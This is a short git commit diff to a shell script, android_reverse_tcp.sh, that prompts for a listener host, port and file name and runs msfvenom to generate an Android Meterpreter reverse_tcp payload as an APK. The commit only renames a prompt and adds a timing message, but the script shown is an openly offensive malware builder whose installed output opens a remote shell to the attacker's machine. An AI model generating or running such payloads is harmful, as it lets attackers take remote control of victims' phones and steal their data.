aaa03c606a0c008b9ea275a2c07d8964772a3ebe
Niirmaal twaatii <60023424+niirmaaltwaatii@users.noreply.github.com>
2020-08-13 15:07:56 +0545

    Update android_reverse_tcp.sh

--- android_reverse_tcp.sh
+++ android_reverse_tcp.sh
@@ -8,10 +8,11 @@ read -p "LHOST: " lhost
     echo ""
     echo "[LPORT]=> $lport"
     echo ""
-    read -p "NAME: " name
+    read -p "FileName: " name
     echo ""
     
     echo "Generating Payload..."
+    echo "[EstimatedTime: 60s]"
     echo ""
     
     msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport -o ${name}.apk
